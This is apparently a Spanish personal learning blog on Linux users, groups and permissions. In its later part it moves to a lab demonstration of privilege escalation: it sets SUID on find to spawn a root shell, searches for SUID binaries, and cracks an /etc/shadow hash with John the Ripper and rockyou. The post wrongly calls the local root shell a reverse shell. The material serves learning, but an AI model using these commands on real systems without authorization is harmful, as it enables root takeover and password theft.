---
title: Diario
published: true
---

<p>Hola aqui estara mi blog donde les mostrare lo que aprendo cada dia, y algunas cosas que ya tengo en cuenta pero que les quiero compartir.</p>
Me pudes contactar por Facebook -> [aqui](https://www.facebook.com/santiagodavid.alvaradocelis)

---
<br>
<p><font color="yellow">[<font color="red">*</font>]</font> <b> : Creacion de usuario y permisos.</b></p>
<br>
<p><font color="yellow">[<font color="red">*</font>]</font><font color="lime"> Reconocimiento en un sistema</font></p>
<p>En linux podemos enumerar los usario activos en el sistema con un par de comandos :</p>
```#!/bin/bash
cat /etc/passwd | grep "sh$" | awk 'NF{print $1}' FS=':'
```

<p><font color="yellow">[<font color="red">*</font>]</font> Creacion de usuarios en el sistema : </p>
<p> Esto es un poco importante ya que este pude ser un vector de vulnerabilidad a explotar.</p>
<p><b>Creacion de usuario :</b></p>
```1
sudo mkdir /home/usuario1 && useradd -d /home/usuario1 -s /bin/bash usuario1
```
<p>Creamos carpeta y posteriormente el usuario. <b>Resumen:</b></p>

* -d siginifica la carpeta del nuevo usuario.

* -s la shell por defecto para el nuevo usuario en este caso<b> usuario1</b>.

<br>
<p> Para ponerle propietario a usuario1 ejecutamos :</p>
```1
sudo chown root:usario1 usuario1
```
<p> En este caso <font color="red">Root</font> es el propietario, para <b>eliminar el usuario simplemente</b> : </p>
```1
sudo userdel usuario1
```
---
<p><font color="yellow">[<font color="red">*</font>]</font> Permisos</p>

<p>Permisos sobre un archivo este se puede <b>resumir</b> en lo siguiente</p>
* r -> Pude leer el fichero [ read ].

* w -> Puede escrbir el fichero [ read ].

* x -> pude ejuctar el archivo [ executable ] o <b>Directorio</b> le permite entonces entrar al directorio.

<br>
<P><b>E</b>stos permisos se dividen en 3 secciones, en este caso es usaremos como ejemplo este permiso:</p> 
`rwx-rwx-rwx`
<p>El cual, esto se pude resumir en :</p>

```
rxw rxw rxw
 p   g   o
```
<p> <font color="yellow">[<font color="red">*</font>]</font> Donde : </p>

* p -> Corresponde al propietario.

* g -> Grupos del propietario.

* o -> Cualquier otra persona.

<br>
Es decir si este permiso estubiera activo ahora `rwx-rwx-rwx` en un archivo, todos tendrian permiso de lectura, escritura, ejecucion.

<font color="lime"><font color="yellow">[<font color="red">*</font>]</font> 2022-07-29</font>
<p><b>P</b>ara los grupos en concreto sea crea de la siguiente forma :</p>
```1
groupadd grupo1
```
Podemos ver el grupo con :
```1
cat /etc/group
```
<p>En la ultima linea estara el grupo que creamos.</p>
<br>

<p>Para ponerle a un determinado <b>grupo</b> un directorio o fichero se hace de la siguienete forma : </p>
```1
chgrp grupo1 directorio1
```
<p>Para añadir a un determinado usuario al grupo se hace de la siguiente manera :</p>
```1
usermod -a -G grupo1 usuario1
```
<p><font color="yellow">[<font color="red">*</font>]</font> Donde : </p>
* <p><font color="">a</font> -> Añadir.</p>

* <p><font color="">G </font>-> Grupo.</p>
<br>

<p>Para ver si el grupo corresponde al usuario podemos hacer :</p>
```1
id usuario1
```
<p>En la parte final estara en un parentesis su grupo, podemos hacer tambien :</p>
```1
id usario1 | tr '()' '\n' | grep "Aqui su grupo a buscar"
```
<p>Una variante de chmod es chattr el cual nos permite efectuar permisos avanzados, esta variante que vamos a hacer
es para que ni <font color="red">Root</font> puede eliminar el archivo creado  entonces : </p>
```1
chattr +i -V ejemplo.txt
```
<p><font color="yellow">[<font color="red">*</font>]</font> Donde:</p>
* +i -> Quiero añadir una flag.

* -V -> Verbose, es decir muestrame por pantalla los cambios efectuados.

<br>
<p> Ahora si hacemos ls -l no vamos a mirar el permiso creado. Para verlo solo se hace con el siguiente comando : </p>
```1
lsattr ejemplo.txt
```
<p>Veremos solo una <font color="yellow"> --i-- </font> que es el respectivo permiso asignado,
lo que hace  que <b>repito</b> ni <font color="red">Root</font> pueda eliminar ese archivo.</p>

<p>Para eliminar el archivo solo tenemos que quitar el permiso entonces para eso :</p>
```1
sudo chattr -i -V ejemplo.txt
```
De esta manera ya pudes hacerle el `rm -rf ejemplo.txt` y te deberia dejar.
<p></p>
-----
<br>
<h3><font color="yellow">[<font color="red">*</font>]</font><font color="lime"> Explotacion y vulnerabilidad de permisos.</font></h3>
<p><font color="yellow"></font> Explotacion por SUID : </p>
<p>Un vector potencial de ataque, donde si hay un comando el cual el propietario es <font color="red">Root</font>
y tenemos permisos <b>SUID</b> sobre un comando, el cual por parametros sea capas de poder ejecutar un comando, podemos
crear una shell como <font color="red">Root</font> sin proporcionar contraseñas.</p>

<p><font color="yellow">[<font color="red">*</font>]</font> Localisamos un comando que sea de propietario <font color="red">Root</font> y que en este caso sea capas de ejecutar comandos en este caso usare
el comando <font color="blue">find</font> el cumple con los requisitos. Ya que</p>
* El propietario es root.
* Con el parametro `-exec` que me permite ejecutar comandos.

<br>
<p>Empezamos viendo los permisos que tiene y su ruta que en mi caso se aloja en la ruta <font color="blue">/usr/bin/find</font>
de seguido miramos sus permisos, para ello :</p>
```1
which find | xargs ls -l
```
<p>Aparecera algo asi : </p>
`r--rwxr-x root root 259 KB Wed Feb  2 05:55:26 2022  /usr/bin/find`

Si observan en los permisos que tiene, no aparece el SUID que se representa con una  `s` para ello si queremos otorgarles permisos de <font color="blue">SUID</font> hacemos :
```1
sudo chmod 4775 /usr/bin/find
```
Claro para otorgarle permisos se necesita de usario <font color="red">Root</font> pero esto solo por una vez, si hacemos de nuevo `which find | xargs ls -l` vemos que en los permisos ya aparece la letra `s` algo asi :
<p></p>
`.rwsrwxr-x root root 259 KB Wed Feb  2 05:55:26 2022  /usr/bin/find`
<p>Ya con esto tendriamos una shell un puerta donde nos metemos como <font color="red">Root</font> sin proporcionar contraseña</p>
para crearnos una [ReverseShell](https://www.google.com/search?client=firefox-b-d&q=ReverseShell)
como <font color="Red">Root</font> hacemos :
```1
find . -exec /bin/bash -p \; -quit
```
<p>y nos creara una ReverseShell como <font color="red">Root</font> siendo cualquier usuario del sistema.
Para revertir el cambio, y que ya ninguno puda crearce un shell como <font color="red">Root</font> ejecutas el siguiente comando :</p>
```1
chmod 775 /usr/bin/find
```
----

<p>podemos buscar tambien permisos <font color="blue">SUID</font> con el comando :</p>
```1
find / \-perm -4000 2>/dev/null
```
<p><font color="yellow">[<font color="red">*</font>]</font> Donde : </p>

* find / -> Es el comando que usaremos para buscar los permisos desde la rais.

* \-perm -> Indicamo que queremos buscar los permisos.

* -4000 -> Le decimos que queremos buscar permisos <font color="blue">SUID</font>.

* 2>/dev/null -> Claro como nosotros no somos usarios privilegiados es decir que no tenemos permisos esos errores los dirigimos a la `/dev/null`
<br>

-----
<h4>Mini span</h4>
<p> Para los que no sepan la <font color="blue">/dev/null</font> es como la papelera de <font color="yellow">Windows</font> a diferencia que en esta (papelera) no pudes recuperar lo que le hayas 
mandado.</p>

El comando `>` es de redireccion es
decir el comando puede servir para redirigir el flujo y salida de un programa, comando, archivo, etc..  por lo que si hacemos:

```1
ifconfig > texto.txt
```
Y si miramos el archivo con un `cat` el <font color="blue">texto.txt</font> Simplemente tendra todo lo que le iba a arrojar el comando ifconfig.

Para los que no sepan los errores en <font color="orange">Linux</font> se representan con el numero  <font color="blue">"2"</font> de cierta forma entonces tenemos control
de los errores lo que hace el comando `2>/dev/null` es mandar los errores <font color="blue">"2"</font> a la basura <font color="blue">/dev/null</font>. 

<p></p>
El comando `>>` se usa comun menta para sobre escribir archivos es decir si haces : 
```1
echo "hola como estas" >> texto2.txt
```
te posicionara lo que le hayas pasado por `echo` en una linea del codigo por lo tanto si vulves a repetir el comando : 
```1
echo "hola estoy bien" >> texto2.txt
```
Se posicionara dentro del archivo sin borrar lo que este adentro. 

A diferecia del comando `>` este si te elimina lo que este adentro,
pero queda lo que tu le hayas pasado.

[puedes encontrar mas informacion descriptiva aqui.](https://www.google.com/search?client=firefox-b-d&q=redireccionamiento+de+errores+en+linux)

<h4> Fin del span</h4>

------

<p></p>
<p><b>E</b>n lo que ibamos estabamos buscando permisos <font color="blue">SUID</font> siendo un usario no priveligiado es decir
no tener los <font color="red">permisos</font> para poder listar directorios dentro de la raiz.</p>

Pues resulta que si logramos ver un comando _"que afin de cuenta no es un comando sino un binario pero
le diremos comando para no confundir"_, que tenga ejucucion de comandos y que de ese lado podamos inyectar codigo sin proporcionar
contraseñas pues ya tendriamos mas privilegios en la maquina.

----

<p></p>
<font color="yellow">[<font color="red">*</font>]</font><font color="lime"> Hashes del sistema :</font>
<p> En linux los hashes que para los que no sepan una hash es la contraseña de un _usuario, dominio, hosts, etc </p>

<p>quedan situados en una ruta del sistema, para los nuevos que estan aprendiendo, hay que aclarar que estamo usando <font color="yellow">Linux</font> y no
<font color="yellow">Windows</font> ya que en <font color="yellow">Windows</font> Son otras rutas.</p>
<p></p>

Retomando lo de los <font color="red">Hashes</font> estos estan situados en una raiz del sistema la cual es <font color="blue">/etc/shadow</font> pero el cual necesitamos permisos para hacerle un cat.

<p>Si queremos ver que encriptamiento usan podemos hacer el comando:</p>
```1
cat /etc/login.defs | grep "ENCRYPT_METHOD"
```
<p>Estos hashes se puden romper con herramientas como la de <font color="red">john the riper</font> el cual nos permite crakearlas.</p>

<p><font color="yellow">[<font color="red">*</font>]</font> Vamos a romper esos hashes.</p>
<p> Nosotros tenemos un diccionario llamado <font color="red">rockyou</font> que podemos encontrarlo en la siguiente ruta, 
haciendo el comando :</p>
```1
cd /usr/share/wordlists/ && ls
```
[En el caso de que no lo tengan puden descargarlo aqui y moverlo a la ruta /usr/share/wordlists/](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjt1NfEjp_5AhX7fTABHfA1BDsQFnoECA0QAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd)

<p>En este caso usaremos el diccionarion mencionado pero no necesariamente tiene que ser este. En este caso rompere este hash:</p>
```1
usuario1:$6$YBUPtV26YKQ5ApPR$jOBAdkGRTNE6.IXHT8BEgdtyj6lGptnY8/ALVYOKgSRb7UiYUHDGTJpeY9IIJ8nt.31H5Ty2ZhZikvjHHOUXQ0:19202:0:99999:7:::
```
La cual la contraseña es `123456`, que si la buscamos en el <font color="red">rockyou</font> con el siguiente comando
```1
cat /usr/share/wordlists/rockyou.txt | grep "123456" -n
```
<p> En mi caso aparece la contraseña en la linea 1.</p>
<p>Para crakerla debemos copiar el hash deseado y meterlo a un txt en este caso mis hash estar en el archivo hash</p>
<p>Para crackearla simplemente haces:</p>
```1
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
<p>Una vez crakeada ejecutamos el comando </p>
```1
john --show hash
```
<p> Veran la contraseña seguido de los 2 puntos donde apareces el nombre del usuario, claro si les da errores es porque no
ha podido crackerla con el diccionario algp asi : </p>
<img src="screenshots/Diario/john.jpg">

-----

<p><font color="yellow">[<font color="red">*</font>]</font>Identificador de hashes</p>
<p> Herramienta de identificacion de  hashes :</p>
* hashid

Para <font color="yellow">linux</font>

```1
sudo apt-get install hashid
```

Para <font color="yellow">arch-linux</font>

```1
paru -S hash id
```

<p><font color="yellow">[<font color="red">!</font>]</font> para los que no tengan <font color="blue">paru</font> en su arch-linux :</p>

```1
cd ~/repos/ && git clone https://aur.archlinux.org/paru.git && cd paru && makepkg -si && yay -S paru
```
<p><font color="blue">hashid</font> Funcionalidad :</p>
```1
hashid  Cualquierhash
```
